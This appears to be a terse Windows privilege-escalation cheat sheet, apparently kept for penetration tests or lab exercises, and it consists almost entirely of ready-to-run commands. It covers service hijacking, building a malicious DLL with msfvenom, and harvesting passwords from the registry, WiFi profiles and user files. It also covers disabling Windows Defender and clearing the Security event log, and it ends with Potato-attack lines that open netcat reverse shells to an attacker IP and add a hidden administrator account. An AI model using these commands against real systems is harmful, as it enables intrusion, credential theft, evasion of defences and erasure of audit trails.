- Access tokens
	- Check hacktricks token abuse
- Administrators Group -> fodhelper UAC bypass
- PowerShell history
```
Get-History
```
```
(Get-PSReadlineOption).HistrorySavePath
```
```
type <PATH>
```
- Service permissions
	- Recommended to use a script like PrivescCheck.ps1
```
sc qc <SERVICE>
```
```
#List service permissions
sc sdshow <SERVICE>
```
```
#List file/folder permissions (eg unquoted service path)
icacls <PATH>
```
```
#Reconfigure service
sc config <SERVICE> binpath="<PATH_TO_EXECUTABLE>" (executable can be a service executable or "cmd /c start /b <EXECUTABLE>")
```
```
sc <START/STOP> <SERVICE>
```
- DLL hijacking
	- Generate a malicious DLL with msfvenom
```
msfvenom <OPTIONS> -f dll -o <NAME>.dll
```
- recent folders/files
```
dir %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent
```
- interesting folders/files
```
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue
```
- passwords in the registry
```
reg query HKLM /f password /t REG_SZ /s
```
- stored WiFi passwords
```
netsh wlan show profiles
```
```
netsh wlan export profile folder=. key=clear
```
- kernel version
- LOLBAS
- Check Applocker/Antivirus status
```
(Get-ApplockerPolicy -Effective).RuleCollections
```
```
Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction  Stop
```
```
Get-MpComputerStatus
```
```
sc query windefend
```
- Disable Windows Defender
```
sc config WinDefend start=disabled
```
```
Set-MpPreference -DisableRealtimeMonitoring $true "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
- Clear Event Log
```
Clear-EventLog -LogName Application, Security
```
- SeImpersonatePrivilege -> Potato Attacks
	- SweetPotato, GodPotato
```
SweetPotato.exe -p nc.exe -a "-nv <IP> <PORT> -e cmd" &
```
```
GodPotato.exe -cmd "nc -nv <IP> <PORT> -e cmd" &
```
```
GodPotato.exe -cmd "net user <USERNAME> <PASSWORD> /add"
```
```
GodPotato.exe -cmd "net localgroup Administrators <USERNAME> /add"
```
```
runascs <USERNAME> <PASSWORD> cmd  -b -r <ATTACKER_IP>:<PORT>
```
- SeRestorePrivilege -> SeRestoreAbuse